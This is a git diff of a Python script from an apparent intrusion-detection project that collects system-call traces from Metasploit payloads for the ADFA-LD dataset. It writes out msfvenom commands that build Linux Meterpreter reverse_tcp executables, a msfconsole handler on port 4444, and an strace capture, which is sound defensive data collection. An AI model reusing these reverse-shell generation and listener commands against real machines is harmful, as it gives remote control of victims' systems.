@@ -1,6 +1,42 @@
 import csv
 import subprocess
 import time
+import psutil
+import os
+import multiprocessing
+import netifaces
+
+
+
+
+def get_my_ip():
+    interfaces = netifaces.interfaces()
+    for interface in interfaces:
+        if interface != 'wlan0':
+            addresses = netifaces.ifaddresses(interface)
+            if netifaces.AF_INET in addresses:
+                ipv4_address = addresses[netifaces.AF_INET][0]['addr']
+                return ipv4_address
+
+
+
+def execute_command(command):
+    process = subprocess.Popen(command, shell=True)
+    process.wait()
+
+def kill_process_by_port(port):
+    for proc in psutil.process_iter():
+        try:
+            connections = proc.connections()
+            for conn in connections:
+                if conn.laddr.port == port:
+                    proc.kill()
+                    print(f"Processus tué : {proc.pid}")
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+
+
+
 
 
 def get_syscall_from_ssh():
@@ -28,48 +64,96 @@ def get_syscall_from_ssh():
 
 
 
+
+
+'''def get_syscall_from_Meterpreter():
+    syscall_names_file_base = 'syscall_names.txt'
+    payload = "meterpreterPayload"
+    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
+    ip = get_my_ip()
+    print('your ip :',ip)
+    kill_process_by_port(4444)
+
+
+
+    command = "msfvenom --list payloads | grep linux | grep meterpreter | awk '{print $1}'"
+    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    out, err = process.communicate()
+    payload_list = out.decode('utf-8').splitlines()
+
+    payload_list_cpu = [None] * len(payload_list)
+    for i in range(len(payload_list)):
+        payload_list_cpu[i] = payload_list[i].split('/')[1]
+        print(payload_list_cpu[i])
+
+        cmd1 = "msfvenom -p {payload_list} LHOST={ip} LPORT=4444 --platform linux -a {payload_list_cpu} -f elf -o {payload}".format(ip=ip, payload=payload,payload_list_cpu=payload_list_cpu[i], payload_list=payload_list[i])
+        cmd2 = "chmod +x {payload}".format(payload=payload)
+
+        process = subprocess.Popen(cmd1, shell=True)
+        process.wait()
+
+        process = subprocess.Popen(cmd2, shell=True)
+        process.wait()
+
+        cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD {payload_list}; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip, payload_list=payload_list[i])
+        cmd4 = "strace -e trace=all -o output.txt ./{payload}; awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)
+        
+        # Exécuter la commande cmd3 dans un terminal
+        print(payload_list[i])
+        print("process1")
+        process = subprocess.Popen(cmd3, shell=True)
+
+        # Exécuter la commande cmd4 dans un terminal
+        print("process2")
+        process = subprocess.Popen(cmd4, shell=True)
+        process.wait()
+        print("process3")
+        process.kill()
+
+
+
+        time.sleep(15)
+        
+        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-{i}.txt'.format(i=i))
+'''
+
 def get_syscall_from_Meterpreter():
     syscall_names_file_base = 'syscall_names.txt'
     payload = "meterpreterPayload"
     csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
 
-    ip = "10.10.10.118"
+    ip = "192.168.1.15"
+    print('your ip :',ip)
+
+    kill_process_by_port(4444)
     cmd1 = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 --platform linux -a x86 -f elf -o {payload}".format(ip=ip, payload=payload)
     cmd2 = "chmod +x {payload}".format(payload=payload)
     cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip)
-    cmd4 = "strace -e trace=all -o output.txt ./{payload}; awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)
-    
+    cmd4 = "strace -e trace=all -o output.txt ./{payload} && awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)
+
     process = subprocess.Popen(cmd1, shell=True)
-    process.wait()
-
     process = subprocess.Popen(cmd2, shell=True)
-    process.wait()
-
-    for i in range(20):
-        
-
-        # Exécuter la commande cmd3 dans un terminal
-        print("process1")
-        process1 = subprocess.Popen(cmd3, shell=True)
 
         
-        print("process2")
-        # Exécuter la commande cmd4 dans un terminal différent
-        process2 = subprocess.Popen(cmd4, shell=True)
-
-        print("fin process1")
-        process1.terminate()
-        process1.terminate()   
-
-        print("fin process2")     
-        process2.terminate()
-
-        # sleep 5 secondes
-        time.sleep(5)
-        
-        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-{i}.txt'.format(i=i))
-
+    # Exécuter la commande cmd3 dans un terminal
+    print("process1")
+    process1 = subprocess.Popen(cmd3, shell=True)
     
+    time.sleep(20)
+
+    # Exécuter la commande cmd4 dans un terminal
+    print("process2")
+    process2 = subprocess.Popen(cmd4, shell=True)
+    process2.wait()
+        
+    process1.kill()
+    process2.kill()
+        
+        
+        
+    replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
+
+
 
 def replace_syscall_with_number(input_file, csv_file, output_file):
     syscall_dict_sys = {}
